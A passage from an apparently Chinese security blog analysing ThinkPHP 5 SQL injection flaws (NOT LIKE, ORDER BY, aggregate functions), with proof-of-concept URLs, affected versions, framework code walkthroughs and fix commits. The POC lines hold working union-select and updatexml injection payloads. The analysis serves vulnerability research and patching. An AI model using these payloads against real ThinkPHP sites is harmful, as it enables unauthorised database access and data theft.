子单元函数方法调用，当操作符为<code>EXP</code> 时，经过拼接带入SQL查询，造成SQL注入。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105750.png" alt="image-20200914235436560"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105805.png" alt="image-20200915000616883"></p><p>完整的方法调用如上图绿色部分。</p><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915105825.png" alt="carbon (1)"></p><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官网未修复。</p><blockquote><p>继承类，等面向对象的基本知识很重要。</p></blockquote><h1 id="SQL注入四-select"><a href="#SQL注入四-select" class="headerlink" title="SQL注入四(select)"></a>SQL注入四(select)</h1><p>漏洞复现环境和上面应该是差不多的。</p><h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index.php&#x2F;index&#x2F;index?username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;233&amp;username[2]&#x3D;)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915125740.png" alt="image-20200915122649716"></p><h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>ThinkPHP: 5.0.10</strong></p><h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生</p></blockquote><p>在MySQL 中 <code>NOT LIKE</code>  为模糊查询，什么是模糊查询呢？</p><blockquote><p>mysql模糊查询like的用法:</p><p>查询user表中姓名中有“王”字的：</p><p>select * from user where name like ‘%王%’</p><p>mysql模糊查询not like的用法</p><p>查询user表中姓名中没有“王”字的：</p><p>select * from user where name not like ‘%王%’</p></blockquote><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>该SQL注入漏洞影响版本为 <code>5.0.10</code> ，因此去 <code>5.0.11</code> 的更新记录中，则可以查看相关的修复操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190936.png" alt="image-20200915132004061"></p><p>Commit ：<a href="https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d">https://github.com/top-think/framework/commit/f43688a30ce921df1c7cda771620c0fbe1868e7d</a></p><p>（ 急需如何快速定位到 某个指定的commit 记录的方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png" alt="image-20200915133611309"></p><p>可以看到，这里之前是没有将特殊字符 <code>NOT LIKE</code>   给过滤掉。</p><hr><p>根据Payload来分析漏洞原理：</p><blockquote><p>不管以哪种方式传递数据给服务器，这些数据在 <strong>ThinkPHP</strong> 中都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法</p></blockquote><p>在<code>input</code> 方法中：传入的数据会经过 filterValue过滤<code>和 </code>强制类型转换,然后返回。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190852.png"></p><p>跟进该方法，查看是如何实现的。发现又会调用到<code>filterExp</code>  方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190840.png" alt="image-20200915142723291"></p><p>可以看到没有过滤<code>NOT LIKE</code></p><blockquote><p>ThinkPHP处理 <strong>SQL</strong> 语句的方法。首先程序先调用 <strong>Query</strong> 类的 <strong>where</strong> 方法，通过其 <strong>parseWhereExp</strong> 方法分析查询表达式，然后再返回并继续调用 <strong>select</strong> 方法准备开始构建 <strong>select</strong> 语句。</p></blockquote><p>![image-20200915144157181](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915144157181.png)</p><p>此处的<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类。而<code>Mysql</code> 类继承于 <code>Builder</code>类，所以会继续调用到<code>Builder</code>类的<code>select</code>方法。该方法调用了<code>parseWhere</code>方法，然后调用了<code>buildWhere</code>方法，该方法继续调用了 <code>parseWhereItem</code> 方法，跟进该方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><p>此处到 操作符 <code>$exp</code> 为 <code>NOT LIKE</code> 或 <code>LIKE</code> 时，MySQL 的逻辑控制符可控。后进行拼接返回带入SQL语句中执行，导致了SQL注入漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185938.png" alt="image-20200915151528489"></p><p>最终的结果就是返回带有恶意的SQL Payload（<code>whereStr</code>，红色部分。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915190030.png" alt="image-20200915184916179"></p><p>整个过程的方法调用情况如绿色框起的部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#96;username&#96; NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# &#96;username&#96; NOT LIKE &#39;233&#39;)</span><br></pre></td></tr></table></figure><h2 id="利用总结-3"><a href="#利用总结-3" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915185921.png"></p><blockquote><p>下图来自七月火师傅的总结文章里的。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915191318.png" alt="9"></p><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>增加过滤</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915140312.png"></p><h1 id="SQL注入五-order-by"><a href="#SQL注入五-order-by" class="headerlink" title="SQL注入五(order by)"></a>SQL注入五(order by)</h1><p>环境搭建也差不多，需要手动开启<code>../config/app.php</code> 下的<code>app_debug</code> 和 <code>app_trace</code></p><h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index&#x2F;?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916002455.png" alt="image-20200915195454500"></p><h2 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong></p><h2 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <code>Builder</code> 类的 <code>parseOrder</code> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 SQL 语句，最终导致 SQL注入漏洞 的产生。</p><h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232420.png" alt="image-20200915201246990"></p><p>![image-20200915202933679](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200915202933679.png)</p><p>从修改记录中看到，增加了一条if判断语句来过滤<code>$key</code>中的<code>)</code> 和 <code>#</code>  。这两个符号也是在CTF中往往会过滤的点。</p><p>我们的数据都会进入到<code>Request</code> 类中的<code>input</code>方法，并且经过<code>filterValue</code>方法的过滤和强制类型转换并返回<code>$data</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232744.png"></p><p>这里<code>array_walk_recursive()</code>函数，对数组中的成员递归调用<code>filterValue</code> 过滤函数。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232803.png" alt="image-20200915205211882"></p><p>但是<code>filterValue</code> 过滤函数，不过滤数组的<code>key</code> ， 只过滤了数组的<code>value</code> 。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p>用户输入的数据会原样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?orderby[id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><p>进入框架的 SQL查询方法中，进入<code>Query</code>类，这次是通过调用<code>order</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232853.png" alt="image-20200915210341486"></p><p>恶意Payload 未经过任何过滤直接传递给<code>options[&#39;order&#39;]</code> 中。接着调用<code>find()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232946.png" alt="image-20200915210940031"></p><p>此处<code>$this-&gt;connection</code> 是<code>think/db/connectior/Mysql</code>类 ，继承于<code>Connection</code>类，于是此处继续调用该类的<code>find()</code>方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233014.png" alt="image-20200915211715450"></p><p>该方法继续调用了 <code>$this-&gt;builder</code>, 即<code>think/db/builder/Mysql</code> 类的<code>select</code> 方法。该方法通过<code>str_replace</code> 函数，将数据填充到SQL语句中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用了<code>parseOrder</code> 方法，跟进下，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseOrder</span>(<span class="params">Query $query, $order</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($order)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $array = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($order <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Expression) &#123;</span><br><span class="line">            $array[] = $val-&gt;getValue();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_array($val)) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseOrderField($query, $key, $val);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;[rand]&#x27;</span> == $val) &#123;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseRand($query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key)) &#123;</span><br><span class="line">                <span class="keyword">list</span>($key, $sort) = explode(<span class="string">&#x27; &#x27;</span>, strpos($val, <span class="string">&#x27; &#x27;</span>) ? $val : $val . <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $sort = $val;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $sort    = strtoupper($sort);</span><br><span class="line">            $sort    = in_array($sort, [<span class="string">&#x27;ASC&#x27;</span>, <span class="string">&#x27;DESC&#x27;</span>], <span class="literal">true</span>) ? <span class="string">&#x27; &#x27;</span> . $sort : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key, <span class="literal">true</span>) . $sort;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; ORDER BY &#x27;</span> . implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的函数中，<code>$order</code> 即是我们输入的数据，然后经过了<code>parseKey</code> 方法处理后返回给<code>$array</code>。</p><p>跟进查看该方法的实现。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233128.png" alt="image-20200915231942203"></p><p>该方法在变量<code>$key</code> 的两端添加了反引号进行拼接，并且没有任何过滤。再和精心构造好的Payload 结合后</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233201.png" alt="image-20200915230823430"></p><p>最终返回了一个带有<code>ORDER BY</code> 的 SQL 注入 payload 给要执行的SQL语句，实现<code>ORDER BY</code> 注入。</p><h2 id="利用总结-4"><a href="#利用总结-4" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915233944.png" alt="8"></p><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190</a></p><h1 id="SQL注入六-Mysql聚合函数注入"><a href="#SQL注入六-Mysql聚合函数注入" class="headerlink" title="SQL注入六(Mysql聚合函数注入)"></a>SQL注入六(Mysql聚合函数注入)</h1><h2 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h2><p>不同版本 <strong>payload</strong> 需稍作调整：</p><p><strong>5.0.0~5.0.21</strong> 、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p><p>这里以<code>5.1.25</code> 版本的ThinkPHP 进行漏洞分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?options&#x3D;id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916003016.png" alt="image-20200916003000509"></p><h2 id="影响版本-5"><a href="#影响版本-5" class="headerlink" title="影响版本"></a>影响版本</h2><p> <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> </p><h2 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p><h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和之前的分析思路一样，先去Github 上找更新版本的commit 记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916004546.png" alt="image-20200916003529194"></p><p><a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p><p>新增加了一条<code>if</code> 判断 语句，用来抛出异常。</p><p>和前几个ThinkPHP 5 SQL 注入漏洞一样，程序都会进入到<code>Query</code> 类中，此处在<code>../application/index/controller/index.php</code> 中，模拟的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $options = request()-&gt;get(<span class="string">&#x27;options&#x27;</span>);</span><br><span class="line">        $result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;max($options);</span><br><span class="line">        var_dump($result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此会先进入到<code>Query</code>类 的 <code>max</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014143.png" alt="image-20200916010724376"></p><p>用户的输入传给了<code>field</code> ：id`)+updatexml(1,concat(0x7,user(),0x7e),1) from users#</p><p>然后该方法继续调用了<code>aggregate</code> 方法，该方法接着调用了<code>$this-&gt;connection</code> 的 <code>aggregate</code>方法，而<code>$this-&gt;connection</code> 为<code>think\db\connector\Mysql</code> 类，而<code>Mysql</code>类继承与<code>Connection</code> 类，故调用该类的<code>aggregate</code> 方法，该方法又调用了<code>$this-&gt;builder</code>，此处为<code>think\db\Builder\Mysql</code> 类的 <code>parseKey</code> 方法。该方法和SQL注入五起到的作用一样。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014123.png" alt="image-20200916012332355"></p><p>理清了调用情况。具体说<code>parseKey</code>方法的作用</p><blockquote><p><strong>parseKey</strong> 方法主要是对字段和表名进行处理，这里只是对我们的数据两端都添加了反引号。经过 <strong>parseKey</strong> 方法处理后，程序又回到了上图的 <strong>$this-&gt;value()</strong> 方法中，该方法会调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来构造 <strong>SQL</strong> 语句。这个方法应该说是在分析 <strong>ThinkPHP</strong> 漏洞时，非常常见的了。其无非就是使用 <strong>str_replace</strong> 方法，将变量替换到 <strong>SQL</strong> 语句模板中。这里，我们重点关注 <strong>parseField</strong> 方法，因为用户可控数据存储在 <strong>$options[‘field’]</strong> 变量中并被传入该方法。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">Query $query</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $options = $query-&gt;getOptions();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(</span><br><span class="line">        [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%DISTINCT%&#x27;</span>, <span class="string">&#x27;%FIELD%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%GROUP%&#x27;</span>, <span class="string">&#x27;%HAVING%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%UNION%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>, <span class="string">&#x27;%FORCE%&#x27;</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseTable($query, $options[<span class="string">&#x27;table&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseDistinct($query, $options[<span class="string">&#x27;distinct&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseField($query, $options[<span class="string">&#x27;field&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseJoin($query, $options[<span class="string">&#x27;join&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseWhere($query, $options[<span class="string">&#x27;where&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseGroup($query, $options[<span class="string">&#x27;group&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseHaving($query, $options[<span class="string">&#x27;having&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseOrder($query, $options[<span class="string">&#x27;order&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLimit($query, $options[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseUnion($query, $options[<span class="string">&#x27;union&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseLock($query, $options[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseComment($query, $options[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parseForce($query, $options[<span class="string">&#x27;force&#x27;</span>]),</span><br><span class="line">        ],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;selectSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>parseFieid</code>方法，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseField</span>(<span class="params">Query $query, $fields</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == $fields || <span class="keyword">empty</span>($fields)) &#123;</span><br><span class="line">        $fieldsStr = <span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_array($fields)) &#123;</span><br><span class="line">        <span class="comment">// 支持 &#x27;field1&#x27;=&gt;&#x27;field2&#x27; 这样的字段别名定义</span></span><br><span class="line">        $array = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $key =&gt; $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($key)) &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $key) . <span class="string">&#x27; AS &#x27;</span> . <span class="keyword">$this</span>-&gt;parseKey($query, $field, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $array[] = <span class="keyword">$this</span>-&gt;parseKey($query, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $fieldsStr = implode(<span class="string">&#x27;,&#x27;</span>, $array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $fieldsStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法未做任何过滤，用户可控数据只是经过 <strong>parseKey</strong> 方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生</p><h2 id="利用总结-5"><a href="#利用总结-5" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://github.com/Ifonly-go2019/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方的修复方法是：当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p><p> <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916014204.png" alt="image-20200916004737749"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;环境准备：&lt;/p&gt;
&lt;ul&gt;
